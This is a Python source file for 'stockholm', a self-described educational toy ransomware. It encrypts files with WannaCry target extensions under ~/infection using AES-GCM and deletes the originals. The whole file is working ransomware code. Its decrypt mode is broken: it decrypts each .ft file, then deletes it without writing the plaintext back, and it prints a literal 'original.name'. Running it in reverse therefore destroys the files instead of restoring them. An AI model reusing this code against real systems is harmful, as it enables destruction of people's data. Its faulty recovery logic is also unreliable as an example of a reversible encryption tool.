import os
import argparse
import sys
from pathlib import Path
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.exceptions import InvalidTag

INFECTION_DIRNAME = "infection"
FT_SUFFIX = ".ft"
VERSION = "1.0.0"
MIN_KEY_LEN = 16
SALT_SIZE = 16
NONCE_SIZE = 12
KEY_SIZE = 32
HEADER_SIZE = SALT_SIZE + NONCE_SIZE

# Key derivation function (KDF)

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = Scrypt(salt=salt, length=KEY_SIZE, n=2**14, r=8, p=1)
    return (kdf.derive(password.encode()))

def encrypt_bytes(plaintext: bytes, password: str) -> bytes:
    salt = os.urandom(SALT_SIZE)
    nonce = os.urandom(NONCE_SIZE)
    key = derive_key(password, salt)
    ct = AESGCM(key).encrypt(nonce, plaintext, None)
    return (salt + nonce + ct) # header prepended

def decrypt_bytes(data: bytes, password: str) -> bytes | None:
    if len(data) < HEADER_SIZE + 16:
        return None
    salt = data[:SALT_SIZE]
    nonce = data[SALT_SIZE:HEADER_SIZE]
    ct = data[HEADER_SIZE:]
    key = derive_key(password, salt)
    try:
        return (AESGCM(key).decrypt(nonce, ct, None))
    except InvalidTag:
        return (None)

# extensions

def load_extensions(filepath: Path) -> set[str]:
    """Load WannaCry target extensions from a text file (one per line)."""
    if not filepath.exists():
        sys.exit(f"stockholm: error: extensions flie not found: {filepath}")
    extensions = set()
    with open(filepath) as f:
        for line in f:
            ext = line.strip()
            if not ext:
                continue
            if not ext.startswith("."):
                ext = "." + ext
            extensions.add(ext.lower())
    return extensions

# filesystem 

def get_infection_dir():
    """Resolve ~/infection and validate it. Exits on failure."""
    home = os.path.expanduser("~")
    if home == "~":
        # expanduser couldn't resolve - neither $HOME nor pwd entry worked
        sys.exit("stockholm: error: could not determine HOME directory")

    path = Path(home) / INFECTION_DIRNAME

    if not path.exists():
        sys.exit(f"stockholm: error: {path} does not exist")
    if not path.is_dir():
        sys.exit(f"stockholm: error: {path} is not a directory")

    # Resolve symlinks and verify we're still inside $HOME/infection
    resolved = path.resolve()
    expected = (Path(home) / INFECTION_DIRNAME).resolve()
    if resolved != expected:
        sys.exit(f"stockholm: error: {path} resolves outside of expected location")

    return resolved

def should_process(file_path: Path, reverse: bool, wannacry_extensions: set[str]) -> bool:
    """Decide whether this file is a target, based on mode."""
    if reverse:
        # decrypt mode: only touch .ft files
        return file_path.suffix == FT_SUFFIX
    else:
        # encrypt mode: skip already-encryped, only target WannaCry extensions
        if file_path.suffix == FT_SUFFIX:
            return False
    return file_path.suffix.lower() in wannacry_extensions

def collect_targets(root: Path, reverse: bool, wannacry_extensions: set[str]) -> list[Path]:
    """Walk root recurisvely and return all files we should operate on."""
    targets = []
    for dirpath, _dirnames, filenames in os.walk(root):
        for name in filenames:
            full_path = Path(dirpath) / name
            if should_process(full_path, reverse, wannacry_extensions):
                targets.append(full_path)
    return targets
    
def encrypt_file(path: Path, password: str, silent: bool) -> None:
    try:
        plaintext = path.read_bytes()
    except OSError as e:
        print(f"stockholm: warning: could not read {path.name}: {e}", file=sys.stderr)
        return
    
    cipherblob = encrypt_bytes(plaintext, password)
    new_path = path.with_name(path.name + FT_SUFFIX)

    try:
        new_path.write_bytes(cipherblob)
    except OSError as e:
        print(f"stockholm: warning: could not write {new_path.name}: {e}", file=sys.stderr)
        return

    try:
        path.unlink()
    except OSError as e:
        new_path.unlink(missing_ok=True)
        print(f"stockholm: warning: could not remove original {path.name}: {e}", file=sys.stderr)
        return

    if not silent:
        print(f"    encrypted: {path.name} -> {new_path.name}")

def decrypt_file(path: Path, password: str, silent: bool) -> None:
    try:
        data = path.read_bytes()
    except OSError as e:
        print(f"stockholm: warning: could not read {path.name}: {e}", file=sys.stderr)
        return

    plaintext = decrypt_bytes(data, password)
    if plaintext is None:
        print(f"stockholm: error: bad key or corrupt file: {path.name}", file=sys.stderr)
        return

    try:
        path.unlink()
    except OSError as e:
        print(f"stockholm: warning: could not remove {path.name}: {e}", file=sys.stderr)
        return

    if not silent:
        print(f"    decrypted: {path.name} -> original.name")

# argparse

def key_arg(value):
    if len(value) < MIN_KEY_LEN:
        raise argparse.ArgumentTypeError(
        f"key must be at least {MIN_KEY_LEN} characters"
        )
    return value

def parse_args():
    parser = argparse.ArgumentParser(
        prog="stockholm",
        description="A toy ransomware that encrypts files in ~/infection. "
                    "For educational purposes only.",
    )
    parser.add_argument(
        "-v", "--version",
        action="version",
        version=f"stockholm v{VERSION}",
    )
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument(
        "-k", "--key",
        type=key_arg,
        help="encryption key (>=16 chars). Triggers encrypt mode.",
    )
    mode.add_argument(
        "-r", "--reverse",
        type=key_arg,
        metavar="KEY",
        help="decryption key. Triggers decrypt (reverse) mode.",
    )
    parser.add_argument(
        "-s", "--silent",
        action="store_true",
        help="suppress per-file output",
    )
    return parser.parse_args()

def main():
    args = parse_args()
    reverse_mode = args.reverse is not None
    password = args.reverse if reverse_mode else args.key

    infection_dir = get_infection_dir()

    extensions_file = Path(__file__).parent / "wannacry_extensions.txt"
    wannacry_extensions = load_extensions(extensions_file)
    
    targets = collect_targets(infection_dir, reverse_mode, wannacry_extensions)

    if not args.silent:
        mode_label = "decrypt" if reverse_mode else "encrypt"
        print(f"[stockholm] {mode_label} mode - {len(targets)} file(s) targeted")

    for target in targets:
        if reverse_mode:
            decrypt_file(target, password, args.silent)
        else:
            encrypt_file(target, password, args.silent)

if __name__ == "__main__":
    main()
